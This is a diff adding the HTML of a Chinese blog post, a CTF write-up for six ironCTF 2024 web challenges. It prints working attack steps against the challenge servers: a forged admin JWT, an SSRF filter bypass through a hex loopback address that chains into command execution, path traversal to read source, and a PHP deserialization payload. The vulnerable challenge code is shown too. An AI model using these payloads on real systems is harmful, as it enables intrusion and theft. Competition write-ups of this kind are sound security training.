@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="好耶！是第一次拿奖的CTF！（虽然说这次re手不在有点可惜） 用户名 得分 LamentTyphon 2468 Jerrythepro123 2610 Dragonkeep 483 WEB JWT Hunt Mango Loan App b64SiteViewer cerealShop MovieR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ironCTF 2024 WEB EICS1 部分wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="好耶！是第一次拿奖的CTF！（虽然说这次re手不在有点可惜） 用户名 得分 LamentTyphon 2468 Jerrythepro123 2610 Dragonkeep 483 WEB JWT Hunt Mango Loan App b64SiteViewer cerealShop MovieR">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18449823/13.png">
+<meta property="article:published_time" content="2024-10-07T03:58:00.000Z">
+<meta property="article:modified_time" content="2024-10-07T03:58:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18449823/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>ironCTF 2024 WEB EICS1 部分wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-10-03-ctf-web-python2python/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&text=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&is_video=false&description=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ironCTF 2024 WEB EICS1 部分wp&body=Check out this article: https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&name=ironCTF 2024 WEB EICS1 部分wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&t=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Hunt"><span class="toc-number">1.1.</span> <span class="toc-text">JWT Hunt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mango"><span class="toc-number">1.2.</span> <span class="toc-text">Mango</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loan-App"><span class="toc-number">1.3.</span> <span class="toc-text">Loan App</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b64SiteViewer"><span class="toc-number">1.4.</span> <span class="toc-text">b64SiteViewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cerealShop"><span class="toc-number">1.5.</span> <span class="toc-text">cerealShop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MovieReviewApp"><span class="toc-number">1.6.</span> <span class="toc-text">MovieReviewApp</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ironCTF 2024 WEB EICS1 部分wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-07T03:58:00.000Z" class="dt-published" itemprop="datePublished">2024-10-07</time>
+        
+        (Updated: <time datetime="2024-10-07T03:58:00.000Z" class="dt-updated" itemprop="dateModified">2024-10-07</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/migrated/18449823/01.png"></p>
+<p>好耶！是第一次拿奖的CTF！（虽然说这次re手不在有点可惜）</p>
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>得分</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LamentTyphon</td>
+<td>2468</td>
+</tr>
+<tr>
+<td>Jerrythepro123</td>
+<td>2610</td>
+</tr>
+<tr>
+<td>Dragonkeep</td>
+<td>483</td>
+</tr>
+</tbody></table>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">WEB</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">JWT Hunt</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">Mango</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">Loan App</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">b64SiteViewer</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">cerealShop</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.6">MovieReviewApp</a></li>
+</ul>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><strong>beginner的web题有点过于唐了。唐题≠难题。</strong></p>
+<h2 id="JWT-Hunt"><a href="#JWT-Hunt" class="headerlink" title="JWT Hunt"></a>JWT Hunt</h2><p>唐题。jwt的secret被四等分在各个角落，还不让用扫描器</p>
+<ul>
+<li>part1: &#x2F;robots.txt</li>
+<li>part2: cookie里</li>
+<li>part3: &#x2F;sitemap.xml</li>
+<li>part4: curl &#x2F;secretkeypart4</li>
+</ul>
+<p>part1,2,4都算常规。part3你告诉我不用扫描器怎么做。。。有点逆天了嗷</p>
+<p>最后是队里pwn✌用“lightfuzz”出的（））</p>
+<p><img src="/images/migrated/18449823/02.png"></p>
+<p>最后凑出来的key：6yH$#v9Wq3e&amp;Zf8LpRt1%Y4nJ^aPk7Sd2C@mQjUwEbGoIhNy0T!BxlVz5uMKA#Yp</p>
+<p>cookie填: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI4MjAwMjYyfQ.IYR8d9sNi0C0e8OYm8-BSh86geTSMzTfonN4o9PKksI</p>
+<p><strong>ironCTF{W0w_U_R34lly_Kn0w_4_L07_Ab0ut_JWT_3xp10r4710n!}</strong></p>
+<h2 id="Mango"><a href="#Mango" class="headerlink" title="Mango"></a>Mango</h2><p>这位更是重量级。看题目以为是MongoDB数据库注入啥的，试了半天没结果。md最后发现直接访问<a target="_blank" rel="noopener" href="https://mango.1nf1n1ty.team/admin/index%E5%B0%B1%E6%9C%89flag%E3%80%82%E3%80%82%E3%80%82%EF%BC%88%E6%97%A0%E8%AF%AD%EF%BC%89">https://mango.1nf1n1ty.team/admin/index就有flag。。。（无语）</a></p>
+<p><strong>ironCTF{I_Said_M@nG0_N0t_M0ngo!}</strong></p>
+<p>好了唐题就到这里。以后这种题少出点真的（</p>
+<h2 id="Loan-App"><a href="#Loan-App" class="headerlink" title="Loan App"></a>Loan App</h2><p>先看配置文件（吸取教训了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">global</span><br><span class="line">    log stdout format raw local0</span><br><span class="line">    maxconn 2000</span><br><span class="line">    user root</span><br><span class="line">    group root</span><br><span class="line">    daemon</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">    log global</span><br><span class="line">    option httplog</span><br><span class="line">    timeout client 30s</span><br><span class="line">    timeout server 30s</span><br><span class="line">    timeout connect 30s</span><br><span class="line"></span><br><span class="line">frontend http_front</span><br><span class="line">    mode http</span><br><span class="line">    bind :80</span><br><span class="line">    acl is_admin path_beg /admin</span><br><span class="line">    http-request deny if is_admin</span><br><span class="line">    default_backend gunicorn</span><br><span class="line"></span><br><span class="line">backend gunicorn</span><br><span class="line">    mode http</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server loanserver loanapp:8000 maxconn 32</span><br></pre></td></tr></table></figure>
+
+<p>看到有一个配置文件上的限制（不能去&#x2F;admin）然而，一般这种都是可以找到现成的漏洞直接绕的（不然这题就没法解了）</p>
+<p>bing了一下，出<strong>CVE-2021-40346</strong></p>
+<p>同样的payload打就完了。这里贴一个别的博客的解</p>
+<p><img src="/images/migrated/18449823/03.png"></p>
+<p>然而，这是预期解。在我做题的时候直接把uuid检测那个函数放bing上搜，搜到了这样的一篇文章：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/25051675/how-to-validate-uuid-v4-in-go">https://stackoverflow.com/questions/25051675/how-to-validate-uuid-v4-in-go</a></p>
+<p>直接输入fbd3036f-0f1c-4e98-b71c-d4cd61213f90直接就tm出flag了？？？？？？</p>
+<p><img src="/images/migrated/18449823/04.png"></p>
+<p>不是哥们。等我搞明白发生肾么事了在把这段补上（</p>
+<h2 id="b64SiteViewer"><a href="#b64SiteViewer" class="headerlink" title="b64SiteViewer"></a>b64SiteViewer</h2><p>附件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from flask import render_template,render_template_string,Flask,request</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import urllib.request</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import base64</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">app.secret_key=os.urandom(16)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def home():</span><br><span class="line">    if request.method==&#x27;GET&#x27;:</span><br><span class="line">        return render_template(&#x27;home.html&#x27;)</span><br><span class="line">    if request.method==&#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            url=request.form.get(&#x27;url&#x27;)</span><br><span class="line">            scheme=urlparse(url).scheme</span><br><span class="line">            hostname=urlparse(url).hostname</span><br><span class="line">            blacklist_scheme=[&#x27;file&#x27;,&#x27;gopher&#x27;,&#x27;php&#x27;,&#x27;ftp&#x27;,&#x27;dict&#x27;,&#x27;data&#x27;]</span><br><span class="line">            blacklist_hostname=[&#x27;127.0.0.1&#x27;,&#x27;localhost&#x27;,&#x27;0.0.0.0&#x27;,&#x27;::1&#x27;,&#x27;::ffff:127.0.0.1&#x27;]</span><br><span class="line">            if scheme in blacklist_scheme:</span><br><span class="line">                return render_template_string(&#x27;blocked scheme&#x27;)     </span><br><span class="line">            if hostname in blacklist_hostname:</span><br><span class="line">                return render_template_string(&#x27;blocked host&#x27;)</span><br><span class="line">            t=urllib.request.urlopen(url)</span><br><span class="line">            content = t.read()</span><br><span class="line">            output=base64.b64encode(content)</span><br><span class="line">            return (f&#x27;&#x27;&#x27;base64 version of the site:</span><br><span class="line">                &#123;output[:1000]&#125;&#x27;&#x27;&#x27;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">                print(e)</span><br><span class="line">                return f&quot; An error occurred: &#123;e&#125; - Unable to visit this site, try some other website.&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;)</span><br><span class="line">def admin():</span><br><span class="line">    remote_addr = request.remote_addr</span><br><span class="line">    </span><br><span class="line">    if remote_addr in [&#x27;127.0.0.1&#x27;, &#x27;localhost&#x27;]:</span><br><span class="line">        cmd=request.args.get(&#x27;cmd&#x27;,&#x27;id&#x27;)</span><br><span class="line">        cmd_blacklist=[&#x27;REDACTED&#x27;]</span><br><span class="line">        if &quot;&#x27;&quot; in cmd or &#x27;&quot;&#x27; in cmd:</span><br><span class="line">            return render_template_string(&#x27;Command blocked&#x27;)</span><br><span class="line">        for i in cmd_blacklist:</span><br><span class="line">            if i in cmd:</span><br><span class="line">                return render_template_string(&#x27;Command blocked&#x27;)</span><br><span class="line">        print(f&quot;Executing: &#123;cmd&#125;&quot;)</span><br><span class="line">        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)</span><br><span class="line">        return res.stdout</span><br><span class="line">    else:</span><br><span class="line">        return render_template_string(&quot;Don&#x27;t hack me&quot;)</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=&#x27;5000&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>一眼ssrf+RCE。我们要绕两个黑名单过滤。RCE这个好说（我们CN CTFER对RCE无所畏惧了已经，新生赛全是这些）主要是SSRF的过滤卡了我一会。</p>
+<p>这里可以用进制绕过</p>
+<p><strong>127.0.0.1 &#x3D;&#x3D; 0x7F.0.0.1</strong></p>
+<p>这题出题人还是有点仁慈了，需要ssti的服务&#x2F;admin居然是get传参。还是相当方便的。</p>
+<p>访问url：<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/admin?cmd=env">http://0x7F.0.0.1:5000/admin?cmd=env</a></p>
+<p>返回：base64 version of the site: b’Q29tbWFuZCBibG9ja2Vk’，解码得Command blocked</p>
+<p>显然我们还有一个黑盒的黑名单要绕，但这个纯唐。随便手fuzz一下就出了</p>
+<p>访问url：<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/admin?cmd=en%5Cv">http://0x7F.0.0.1:5000/admin?cmd=en\v</a></p>
+<p>出：base64 version of the site: b’U0hMVkw9MQpPTERQV0Q9LwpMQ19DVFlQRT1DLlVURi04CldFUktaRVVHX1NFUlZFUl9GRD0zCmZsYWc9aXJvbkNURnt5MHU0cjNyMGNrMW42azMzcGg0Y2sxbjZ9Cl89L3Vzci9sb2NhbC9iaW4vcHl0aG9uClBXRD0vaG9tZS91c2VyCg&#x3D;&#x3D;’</p>
+<p>解码得flag</p>
+<p><strong>ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}</strong></p>
+<h2 id="cerealShop"><a href="#cerealShop" class="headerlink" title="cerealShop"></a>cerealShop</h2><p>黑盒题。进去F12看源码：</p>
+<p><img src="/images/migrated/18449823/05.png"></p>
+<p>看到file想到路径穿越漏洞。先正常读取一个试试水</p>
+<p><a target="_blank" rel="noopener" href="https://cerealshop.1nf1n1ty.team/?file=styles.css">https://cerealshop.1nf1n1ty.team/?file=styles.css</a></p>
+<p><img src="/images/migrated/18449823/06.png"></p>
+<p>没问题</p>
+<p>根据base64中的提示访问..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;source出源码</p>
+<p><img src="/images/migrated/18449823/07.png"></p>
+<p>整理源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 获取通过GET请求传递的文件名</span><br><span class="line">$file = $_GET[&#x27;file&#x27;]; </span><br><span class="line"></span><br><span class="line">// 包含（执行）指定的文件</span><br><span class="line">includeFile($file); </span><br><span class="line"></span><br><span class="line">// 获取环境变量中的FLAG值</span><br><span class="line">$FLAG = getenv(&#x27;FLAG&#x27;); </span><br><span class="line"></span><br><span class="line">class Admin &#123;</span><br><span class="line">    // 类的属性</span><br><span class="line">    public $is_admin = &quot;&quot;;</span><br><span class="line">    public $your_secret = &quot;&quot;;</span><br><span class="line">    public $my_secret = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    // 类的构造函数</span><br><span class="line">    public function __construct($in, $ysecret, $msecret) &#123;</span><br><span class="line">        // 使用md5加密传入的$in值，并赋值给is_admin属性</span><br><span class="line">        $this-&gt;is_admin = md5($in); </span><br><span class="line">        // 直接赋值给其他两个属性</span><br><span class="line">        $this-&gt;your_secret = $ysecret; </span><br><span class="line">        $this-&gt;my_secret = $msecret; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 魔术方法__toString，当对象被用在需要字符串的上下文中时会被调用</span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        // 返回is_admin属性的值</span><br><span class="line">        return $this-&gt;is_admin; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查是否存在名为&#x27;can_you_get_me&#x27;的cookie</span><br><span class="line">if (isset($_COOKIE[&#x27;can_you_get_me&#x27;])) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 对cookie中的值进行base64解码</span><br><span class="line">        $f = base64_decode($_COOKIE[&#x27;can_you_get_me&#x27;]);</span><br><span class="line">        // 如果解码失败，抛出异常</span><br><span class="line">        if (!$f) &#123;</span><br><span class="line">            throw new Exception(&quot;&quot;); </span><br><span class="line">        &#125;</span><br><span class="line">        // 反序列化解码后的字符串</span><br><span class="line">        $unout = unserialize($f); </span><br><span class="line">        // 如果反序列化失败，抛出异常</span><br><span class="line">        if (!$unout) &#123;</span><br><span class="line">            throw new Exception(&quot;\n wrong cookie&quot;); </span><br><span class="line">        &#125;</span><br><span class="line">        // 设置对象的my_secret属性为FLAG的值</span><br><span class="line">        $unout-&gt;my_secret = $FLAG; </span><br><span class="line">        // 检查is_admin属性是否为0（md5加密后的0），以及your_secret是否等于my_secret</span><br><span class="line">        if ($unout-&gt;is_admin == 0 &amp;&amp; $unout-&gt;your_secret === $unout-&gt;my_secret) &#123;</span><br><span class="line">            // 如果条件满足，输出FLAG</span><br><span class="line">            echo &quot;Okay here is your flag:&quot;, $FLAG; </span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则输出&quot;no&quot;</span><br><span class="line">            echo &quot;no &quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">        // 捕获并输出异常信息</span><br><span class="line">        echo &quot;Error: &quot; . $e-&gt;getMessage()</span><br></pre></td></tr></table></figure>
+
+<p>一个经典的反序列化漏洞。可以看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18147817#1.10">https://www.cnblogs.com/LAMENTXU/articles/18147817#1.10</a> 第一关几乎一样</p>
+<p>搓链子出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Admin &#123;</span><br><span class="line">    public $is_admin = 0;</span><br><span class="line">    public $your_secret = &quot;&quot;;</span><br><span class="line">    public $my_secret = &quot;&quot;;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">		$this-&gt;my_secret = &#x27;a&#x27;;</span><br><span class="line">        $this-&gt;your_secret = &amp;$this-&gt;my_secret;  </span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        return $this-&gt;is_admin; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Admin()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把输出填进cookie里（can_you_get_me）得flag</p>
+<p><img src="/images/migrated/18449823/08.png"></p>
+<p><strong>ironCTF{D353r1411Z4710N_4T_1T5_B35T}</strong></p>
+<h2 id="MovieReviewApp"><a href="#MovieReviewApp" class="headerlink" title="MovieReviewApp"></a>MovieReviewApp</h2><p>.git泄露源码</p>
